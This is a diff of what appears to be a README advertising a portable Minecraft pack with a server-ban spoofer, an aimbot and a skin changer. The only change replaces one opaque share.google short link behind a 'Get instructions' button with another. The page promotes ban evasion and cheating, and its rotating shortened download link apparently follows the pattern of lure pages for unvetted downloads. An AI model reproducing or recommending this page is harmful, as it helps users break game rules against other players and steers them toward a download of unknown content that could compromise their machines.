@@ -5,7 +5,7 @@
 Download the **Minecraft** pack: a spoofer for Server-side bans, a configurable aimbot and a full skin changer in a single portable file. **No subscription, no account, works offline.**
 
 <p align="center">
-  <a href="https://share.google/ZSy56l9ZbhJayKS1g"><img src="button.svg" alt="Get instructions" height="46"></a>
+  <a href="https://share.google/KGDORF6a86tnaASTy"><img src="button.svg" alt="Get instructions" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
